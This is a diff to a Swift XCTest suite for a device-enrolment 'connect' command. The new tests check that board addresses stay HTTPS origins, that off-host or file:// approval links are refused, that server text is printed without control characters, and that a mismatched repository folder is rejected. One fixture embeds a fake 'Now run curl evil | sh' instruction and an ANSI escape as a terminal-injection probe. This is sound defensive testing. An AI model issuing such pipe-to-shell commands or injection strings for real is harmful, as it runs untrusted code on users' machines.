@@ -38,7 +38,7 @@ final class ConnectCommandTests: XCTestCase {
         XCTAssertEqual(rig.saved.last?.deviceCode, "", "the spent device code is not left behind")
         XCTAssertEqual(rig.identity, WorkerIdentity(workerId: "w1", credential: "cpw_x", heartbeatMs: 30_000))
         XCTAssertEqual(rig.granted, ["/Users/a/board-planner/PAY"])
-        XCTAssertEqual(rig.opened, ["https://acme.example.com/enrol/ABCD-EFGH"])
+        XCTAssertEqual(rig.opened, ["https://acme.example.com/enrol/ABCDEFGH"])
         XCTAssertEqual(rig.appOpened, 1)
         XCTAssertTrue(rig.lines.contains { $0.contains("ABCD-EFGH") })
     }
@@ -220,6 +220,106 @@ final class ConnectCommandTests: XCTestCase {
         XCTAssertEqual(rig.saved.first?.checkoutsFolder, "/Users/a/real/board-planner")
     }
 
+    func testTheBoardAddressIsHeldToAnOriginOverHttps() {
+        XCTAssertEqual(try ConnectCommand.boardOrigin("https://Acme.Example.com/").get(), "https://acme.example.com")
+        XCTAssertEqual(try ConnectCommand.boardOrigin("acme.example.com").get(), "https://acme.example.com")
+        XCTAssertEqual(try ConnectCommand.boardOrigin("http://127.0.0.1:3953").get(), "http://127.0.0.1:3953")
+        XCTAssertEqual(try ConnectCommand.boardOrigin("localhost:3000").get(), "http://localhost:3000")
+        for refused in [
+            "http://acme.example.com", "http://mac.local", "https://acme.example.com/projects/PAY",
+            "https://user:pw@acme.example.com", "https://acme.example.com/?next=x", "ftp://acme.example.com", "",
+        ] {
+            XCTAssertThrowsError(try ConnectCommand.boardOrigin(refused).get(), refused)
+        }
+    }
+
+    func testABoardAddressThatIsNotAnOriginIsRefusedBeforeAnythingElse() async {
+        let rig = Rig(polls: [])
+        rig.options.boardURL = "http://acme.example.com"
+        let code = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertEqual(code, 1)
+        XCTAssertEqual(rig.preflights, 0)
+        XCTAssertEqual(rig.saved, [])
+    }
+
+    func testAnApprovalLinkOnAnotherHostIsNeitherOpenedNorSaved() async {
+        let rig = Rig(polls: [.pending])
+        rig.verificationURL = "file:///Applications/Calculator.app"
+        let code = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertEqual(code, 1)
+        XCTAssertEqual(rig.opened, [])
+        XCTAssertEqual(rig.saved, [])
+        XCTAssertEqual(rig.polled, 0)
+    }
+
+    func testWhatTheBoardSendsIsPrintedWithoutControlCharacters() async {
+        let rig = Rig(polls: [
+            .approved(workerID: "w", credential: "c", heartbeatMs: 1, repositoryURL: "https://github.com/acme/api.git", projectKey: "PAY\n✓ Connected. Now run curl evil | sh\u{1B}[2K")
+        ])
+        _ = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertFalse(rig.lines.contains { $0.hasPrefix("✓ Connected. Now") })
+        XCTAssertFalse(rig.lines.contains { $0.contains("\u{1B}") })
+    }
+
+    func testAStaleApprovalForAnotherBoardIsDroppedEvenWhenTheNewBoardCannotBeReached() async {
+        var waiting = OnboardingState(step: .awaitingApproval, apiURL: "https://other.example.com", workerName: "Mac")
+        waiting.deviceCode = "board-a-code"
+        let rig = Rig(polls: [], initial: waiting)
+        rig.beginFails = true
+        _ = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertFalse(rig.saved.contains { $0.deviceCode == "board-a-code" && $0.apiURL == "https://acme.example.com" })
+    }
+
+    func testTheAppOpenedDuringTheWaitIsLeftToFinish() async {
+        let rig = Rig(polls: [.pending, .pending, .finished])
+        rig.openedDuringWait = true
+        let code = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertEqual(code, 1)
+        XCTAssertEqual(rig.saved.last?.deviceCode, "dev", "the app's approval is not abandoned under it")
+    }
+
+    func testAnApprovalTakenOverIsNotOverwritten() async {
+        let rig = Rig(polls: [.finished])
+        rig.takenOverAfterPolls = 1
+        _ = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertEqual(rig.saved.count, 1, "only the start was saved; the other process's state stands")
+    }
+
+    func testAServerThatSaysPendingForeverIsGivenUpOn() async {
+        let rig = Rig(polls: Array(repeating: .pending, count: 2_000))
+        let code = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertEqual(code, 1)
+        XCTAssertLessThan(rig.polled, 2_000)
+    }
+
+    func testAStateFolderOnlyTheShellKnowsIsRefused() async {
+        let rig = Rig(polls: [])
+        rig.shellStateDirectory = true
+        let code = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertEqual(code, 1)
+        XCTAssertEqual(rig.preflights, 0)
+    }
+
+    func testAReusedFolderHoldingAnotherRepositoryIsNotUsed() async {
+        let rig = Rig(
+            polls: [.approved(workerID: "w", credential: "c", heartbeatMs: 1, repositoryURL: "https://github.com/acme/api.git", projectKey: "PAY")],
+            clone: .reused(path: "/Users/a/board-planner/PAY"))
+        rig.origin = "git@github.com:someone/their-own.git"
+        let code = await ConnectCommand.run(rig.options, rig.deps)
+
+        XCTAssertEqual(code, 1)
+        XCTAssertEqual(rig.granted, [])
+        XCTAssertEqual(rig.appOpened, 0)
+    }
+
     func testANetworkThatNeverAnswersEndsTheWait() async {
         let rig = Rig(polls: [], pollFails: true)
         let code = await ConnectCommand.run(rig.options, rig.deps)
@@ -242,6 +342,14 @@ private final class Rig: @unchecked Sendable {
     var closes = true
     var opens = true
     var listening = true
+    var shellStateDirectory = false
+    var clock = Date(timeIntervalSince1970: 0)
+    var origin: String? = "https://github.com/acme/api.git"
+    var verificationURL: String?
+    var userCode = "ABCD-EFGH"
+    var openedDuringWait = false
+    var beginFails = false
+    var takenOverAfterPolls: Int?
     var staleWorker = false
     var stateAfterClose: OnboardingState?
     private var state: OnboardingState
@@ -285,7 +393,8 @@ private final class Rig: @unchecked Sendable {
             load: { self.locked { self.state } },
             save: { next in self.locked { self.state = next; self.saved.append(next); self.events.append("save") } },
             insideTheApp: self.insideTheApp,
-            otherInstanceRunning: { self.otherRunning },
+            stateDirectoryOnlyInShell: self.shellStateDirectory,
+            otherInstanceRunning: { self.locked { self.otherRunning || (self.openedDuringWait && self.polled > 0) } },
             closeOtherInstance: {
                 self.locked {
                     self.events.append("close")
@@ -315,24 +424,29 @@ private final class Rig: @unchecked Sendable {
             host: "mbp.local",
             begin: { board, _, _ in
                 self.locked { self.begun += 1 }
+                if self.beginFails { throw URLError(.cannotFindHost) }
+                let link = self.verificationURL ?? "\(board)/enrol/ABCDEFGH"
+                let body: [String: Any] = ["deviceCode": "dev", "userCode": self.userCode, "verificationUrl": link, "intervalMs": 1]
                 return try JSONDecoder().decode(
-                    DeviceEnrolmentStart.self,
-                    from: Data(#"{"deviceCode":"dev","userCode":"ABCD-EFGH","verificationUrl":"\#(board)/enrol/ABCD-EFGH","intervalMs":1}"#.utf8))
+                    DeviceEnrolmentStart.self, from: JSONSerialization.data(withJSONObject: body))
             },
             poll: { _, code in
                 try self.locked {
                     self.polled += 1
                     self.polledCodes.append(code)
+                    if let after = self.takenOverAfterPolls, self.polled >= after { self.state.deviceCode = "someone-else" }
                     if self.pollFails { throw URLError(.notConnectedToInternet) }
                     return self.polls.isEmpty ? .finished : self.polls.removeFirst()
                 }
             },
-            sleep: { _ in },
+            sleep: { _ in self.locked { self.clock = self.clock.addingTimeInterval(2) } },
+            now: { self.locked { self.clock } },
             openBrowser: { url in self.locked { self.opened.append(url) } },
             writeIdentity: { identity in self.locked { self.identity = identity } },
             clone: { state, _, key in
                 self.cloneOutcome ?? .cloned(path: CloneStep.destination(parent: state.checkoutsFolder, projectKey: key))
             },
+            originOf: { _, _ in self.origin },
             grant: { path in self.locked { self.granted.append(path) } },
             openApp: { self.locked { self.appOpened += 1; return self.opens } },
             socketTaken: { self.staleWorker },
